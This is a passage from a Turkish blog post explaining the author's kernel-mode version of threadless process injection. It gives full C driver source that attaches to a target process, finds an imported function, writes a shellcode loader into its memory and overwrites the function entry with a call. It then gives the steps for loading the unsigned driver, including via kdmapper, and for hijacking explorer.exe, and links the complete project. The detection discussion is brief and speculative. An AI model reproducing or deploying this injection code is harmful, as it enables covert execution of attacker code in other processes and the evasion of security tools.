    if (importDir.VirtualAddress == 0) return NULL;

    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((unsigned char*)moduleBase + importDir.VirtualAddress);

    while (importDesc->Name) {
        char* dllName = (char*)((unsigned char*)moduleBase + importDesc->Name);
        DbgPrint("Module Name: %s\n", dllName);
        PIMAGE_THUNK_DATA64 origThunk = (PIMAGE_THUNK_DATA64)((unsigned char*)moduleBase + importDesc->OriginalFirstThunk);
        PIMAGE_THUNK_DATA64 firstThunk = (PIMAGE_THUNK_DATA64)((unsigned char*)moduleBase + importDesc->FirstThunk);

        while (origThunk->u1.AddressOfData) {
            if (!(origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME)((unsigned char*)moduleBase + origThunk->u1.AddressOfData);
                DbgPrint("-> %s\n", (const char*)name->Name);
                if (_stricmp((const char*)name->Name, targetFuncName) == 0) {
                    DbgPrint("Found! addr: %p", firstThunk->u1.Function);
                    return (PVOID)(firstThunk->u1.Function);
                }
            }
            origThunk++;
            firstThunk++;
        }
        importDesc++;
    }

    return NULL;
}

VOID DriverUnload(PDRIVER_OBJECT pDriverObject) {
    UNICODE_STRING symLink;
    RtlInitUnicodeString(&symLink, SYMLINK_NAME);
    IoDeleteSymbolicLink(&symLink);
    IoDeleteDevice(pDriverObject->DeviceObject);
}

NTSTATUS create_io(PDEVICE_OBJECT device_obj, PIRP irp) {
    UNREFERENCED_PARAMETER(device_obj);

    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return irp->IoStatus.Status;
}

NTSTATUS close_io(PDEVICE_OBJECT device_obj, PIRP irp) {
    UNREFERENCED_PARAMETER(device_obj);

    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return irp->IoStatus.Status;
}

NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;

    if (stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_IAT_PATCH) {
        PINJECTION_DATA data = (PINJECTION_DATA)Irp->AssociatedIrp.SystemBuffer;

        DbgPrint("Target PID: %x\n", data->pid);
        DbgPrint("Hooking function name: %s\n", data->functionName);

        PEPROCESS targetProc = NULL;
        if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)data->pid, &targetProc))) {//Kernel seviyesi driver ımız client den gelen pid i kullanarak `PsLookupProcessByProcessId` api si ile PEPROCESS objesini elde ediyor.
            KAPC_STATE apc;
            KeStackAttachProcess(targetProc, &apc);// Sonra hedef process e `KeStackAttachProcess` api si ile attach oluyor bu bizim kernel driver ımızın hedef process in adresi alanına geçmesini sağlıyor bu sayede hedef memory de kafamıza göre takılabiliyoruz.

            PPEB pPeb = NULL;
            PLIST_ENTRY pDllListHead = NULL;
            UNICODE_STRING usMethodName;

            PVOID imageBase = NULL;


            pPeb = PsGetProcessPeb(targetProc);//`PsGetProcessPeb` api si ile peb structure ının adresini alıyoruz.
            imageBase = pPeb->ImageBaseAddress;//Sonra bu adresi kullanarak imageBase adresini alıyoruz.
            PVOID func = GetImportedFunctionAddress(imageBase, data->functionName);//imageBase sayesinde artık MZ Header başlangıcını bildiğimizden import table ın yerini bulabiliyoruz. Sonra size yukarda anlattığım yolla client ın hook atmamızı istediği fonksiyonun adresini IAT dan buluyoruz(`GetImportedFunctionAddress` fonksiyonunda gerçekleşiyor bu olay).
            PVOID funcc = func;//aşağıda açıklayacağım sebepten ötürü burda fonksiyon adresini yedekliyoruz
            if (!func) {
                IoCompleteRequest(Irp, IO_NO_INCREMENT);
                return status;
            }
            //Artık fonksiyon adresimizi bulduk şimdi shellcode u memory ye yerleştirip fonksiyonun girişine hook atmak kaldı.
            //Bundan sonrası ilk parça da anlattığım basit bir saldırıdaki csharp koduna çok benziyor sadece api lerin kernel mode versiyonları farklı.
            unsigned char finalPayload[512];
            memset(finalPayload, 0, sizeof(finalPayload));
            memcpy(&ShellcodeLoader[0x12], func, sizeof(PVOID));//ShellCodeLoader ın placeholder kısmına hook fonksiyonunun patch edilecek kısmını dolduruyoruz bu sayede shellcode çalıştırıldıktan sonra fonksiyonu eski haline getirebilicez.
            memcpy(finalPayload, ShellcodeLoader, sizeof(ShellcodeLoader));
            memcpy((unsigned char*)finalPayload + sizeof(ShellcodeLoader), CalcX64, sizeof(CalcX64));//ShellCodeLoader ve shellcode u finalPayload isimli başka bir değişkende topluyoruz.
            unsigned char callOpCode[5] = {0xe8, 0, 0, 0, 0};

            //PVOID loaderAddress = NULL;
            SIZE_T payloadSize = sizeof(finalPayload);
            PVOID baseAddress = NULL;
            FindMemoryHole(ZwCurrentProcess(), funcc, sizeof(finalPayload), &baseAddress);//Sonra hook atacağımız fonksiyon adresinden relative call ile gidilebilecek bir yeri allocate etmek için `FindMemoryHole` fonksiyonnu çağırıyoruz.

            SIZE_T bytesCopied = 0;
            status = MmCopyVirtualMemory(PsGetCurrentProcess(), finalPayload, targetProc, baseAddress, sizeof(finalPayload), KernelMode, &bytesCopied);//Allocate ettiğimiz adrese payload u yerleştiriyoruz.
            if (!NT_SUCCESS(status)) {
                DbgPrint("[-] MmCopyVirtualMemory1 failed: 0x%X\n", status);
                goto cleanup;
            }

            INT32 relOffset = (INT32)((UINT64)baseAddress - ((UINT64)func + 5));
            memcpy(&callOpCode[1], &relOffset, sizeof(INT32));
            ULONG oldProtect = 0;
            SIZE_T regionSize = sizeof(callOpCode);
            status = ZwProtectVirtualMemory(ZwCurrentProcess(), &funcc,&regionSize,PAGE_EXECUTE_READWRITE,&oldProtect);//hook atacağımız fonksiyon adresinin protect mode unu değiştirmek için `ZwProtectVirtualMemory` api sini çağrıyoruz
            funcc = func;//bu api ile ilgili ilginc bir detay var ki api protect mode unu değiştirmek için ona verdiğiniz adresi protect mode unu değiştirdiği adres page inin başı yapıp size geri veriyor bu yüzden func adresini tekrar funcc un üzerine yazıyorum. Bunu fark edene kadar başıma neler geldi inanamazsınız:D
            if (!NT_SUCCESS(status)) {
                DbgPrint("[-] ZwProtectVirtualMemory1 failed: 0x%X\n", status);
                goto cleanup;
            }
            status = MmCopyVirtualMemory(PsGetCurrentProcess(), callOpCode, targetProc, funcc, sizeof(callOpCode), KernelMode, &bytesCopied);//relative call için offset hesaplıyoruz bu offset i kullanarak instruction u oluşturup hook fonksiyonunun üzerine yazıyoruz
            if (!NT_SUCCESS(status)) {
                DbgPrint("[-] MmCopyVirtualMemory2 failed: 0x%X\n", status);
                goto cleanup;
            }
            //Sonra protect i gene eski haline getirmem gerekiyor aslında ama bunu yapmadım çünkü yaparsam shellcode oraya eski fonksiyon instruction ı yazmaya çalıştığında access hatası alıyor o yüzden orjinal [ThreadlessInject](https://github.com/CCob/ThreadlessInject/tree/master) projesinde 60 saniye beklenip
            //instruction eğer eskisi gibiyse shellcode un restore işleminin gerçekleştiği varsayılıp protect mode u düzeltiliyor ama ben kendi kodlarımda 60 saniye beklemeyi reddettiğim için banane edasıyla bunu sadece boşvermeye karar verdim.
            /*
            status = ZwProtectVirtualMemory(ZwCurrentProcess(),&funcc,&regionSize,oldProtect,&oldProtect);
            if (!NT_SUCCESS(status)) {
                DbgPrint("[-] ZwProtectVirtualMemory2 failed: 0x%X\n", status);
                goto cleanup;
            }
            */
        // Sonrasında attach olduğumuz process den çıkıyoruz ve irp yi işlemin bitirildiğine yönelik düzenleyip fonksiyondan çıkışımızı gerçekleştiriyoruz.
        cleanup:
            ObDereferenceObject(targetProc);
            KeUnstackDetachProcess(&apc);
            Irp->IoStatus.Status = status;
            Irp->IoStatus.Information = 0;
            IoCompleteRequest(Irp, IO_NO_INCREMENT);
        }
        else {
            status = STATUS_INVALID_PARAMETER;
        }
    }
    return status;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING RegistryPath) {
    UNICODE_STRING devName, symLink;
    PDEVICE_OBJECT devObj = NULL;
    NTSTATUS status;
    RtlInitUnicodeString(&devName, DEVICE_NAME);
    RtlInitUnicodeString(&symLink, SYMLINK_NAME);
    status = IoCreateDevice(pDriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &devObj);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] IoCreateDevice failed: 0x%X\n", status);
        return status;
    }
    status = IoCreateSymbolicLink(&symLink, &devName);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] IoCreateSymbolicLink failed: 0x%X\n", status);
        IoDeleteDevice(devObj);
        return status;
    }
    SetFlag(pDriverObject->Flags, DO_BUFFERED_IO);
    pDriverObject->MajorFunction[IRP_MJ_CREATE] = create_io; //link our io create function
    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = close_io;
    pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;
    pDriverObject->DriverUnload = DriverUnload;
    ClearFlag(pDriverObject->Flags, DO_DEVICE_INITIALIZING);
    DbgPrint("[+] Driver loaded successfully\n");
    return STATUS_SUCCESS;
}
```
Bu driver ın tetiklendiği 3 an var bunlar create, close, ve device_control. create tetiği client tarafında device a erişmek için `CreateFile` tarzı bir api kullanıldığı, close `CloseHandle` tarzı bir api ile device handle kapatıldığında. device_control ise DeviceIoControl api si ile driver a control code u gönderildiğinde tetiklenir ki biz sistemi bu api üzerinden iletişim kurma şeklinde geliştirdiğimiz için önemli kısım device_control tetiği şimdilik. device_control tetiğinin hangi fonksiyonu çağıracağını belirlemek için `pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;` kodu ile MajorFunction dizisinin `IRP_MJ_DEVICE_CONTROL` index ine çağrılmasını istediğimiz fonksiyonu yazdık.
Bu fonksiyon öncelikle kendisine gelen IRP (I/O Request Packet) paketini açıyor bu client in gönderdiği verileri içeren bir paket. Ve control code unu kontrol ediyor eğer `IOCTL_IAT_PATCH` ise işlemlerimiz başlıyor.

Eveet. Kodu kendi içinde yorum satırlarıyla olabildiğince güzel açıklamaya çalıştım şimdi bunu derleyip işletim sistemine kernel driver olarak yüklemek kaldı.
Windows her önüne gelen driver ın kernel e yüklenmesini istemiyor o yüzden sadece imzalı driver lara izin var. İmza içinde bazı yerlere para ödemek gerekiyor ki para ödesemde bu driver ı imzalatamam büyük ihtimal. O yüzden bizde iki yöntemden birini yapacaz:
 - [kdmapper](https://github.com/TheCruZ/kdmapper) gibi projeler imzalı driver lardaki kernel mode memory ye yetkisiz yükleme açıklarını kullanarak kernel mode a imzasız driver ımızı yükleyebilmemizi sağlar.
 - "bcdedit /set testsigning on" komudu ile imzasız driver larımızı sisteme yükleyebiliriz. Bu adı üstünde bir test modudur, geliştiriciler içindir.

ben şimdilik bcdedit den gidelim diyorum exploit kovalamaya gerek yok.
komudu yazıp bilgisayarı yeniden başlatıyoruz sonra driver ımızı yüklemeye hazırız.
`sc create LimonOtu type=kernel binPath=kerneldriverdosyayolu`
komudu ile LimonOtu adında bir kernel driver oluşturuyoruz
`sc start LimonOtu`
komudu ile de driver ımızı başlatıyoruz bu driver ın DriverEntry adresinin çalıştırıldığı anlamına geliyor dbgview gibi bir tool la DbgPrint mesajlarını yakalamaya çalışırsanız bu komuttan sonra "[+] Driver loaded successfully" mesajını görebilirsiniz.
Şimdi sıra driver imiz aracılı ile hijack işlemini başlatmakta bunun içinde client i derleyelim ben limoncuk.exe olarak derledim.
`limoncuk.exe explorer.exe TranslateAcceleratorW`
komuduna yazıp çalıştırdığımız anda shellcode un tetiklenmesi gerekiyor.
<video width="640" height="360" controls>
  <source src="/videos/control-flow-hijack-mid-poc.mkv" type="video/mp4">
  Tarayıcınız video etiketini desteklemiyor.
</video>
Kernel driver ve client için full proje linki: [https://github.com/SemsYapar/ThreadlessKernelInject/tree/main](https://github.com/SemsYapar/ThreadlessKernelInject/tree/main)
## Kapanış

Yani sonuç itibariyle IAT hooking yapmıyoruz çünkü IAT de bir değişiklik yapmıyoruz sadece istediğimiz fonksiyonun adresini bulmak için IAT yi kullanıyoruz.
Bu kernel taraflı saldırı için bir  tespit mekanizması nasıl olur açıkçası daha bunun üzerine ciddli olarak düşünmedim ama memory mizi sürekli okuyabiliriz belki enazından IAT daki fonksiyonların ilk kısımlarını. Hızlı hızlı okuruz değişiklik olduğu anda bir saldırıya maruz kaldığımızı tespit ederiz? Belki ama bence hızımız yavaş kalır ve tespit edemeyiz. Başka ne yapabiliriz? Bizde bir kernel driver yazıp bizim process imze veya fonksiyonlarımıza ulaşmak ve veri yazmak için kullandığı `MmCopyVirtualMemory`, `PsGetProcessPeb` gibi api lere hook atabiliriz? Tabii kernel level api lere nasıl hook atılır bilmiyorum salladım sadece. Ve argümanları kontrol edip tehdit var mı yok mu analiz ederiz dinamik tespit kısmında yaptığımız gibi ve buna göre engelleme yaparız.
Şimdilik benden bu kadar. Kendinize iyi bakın. Selametle.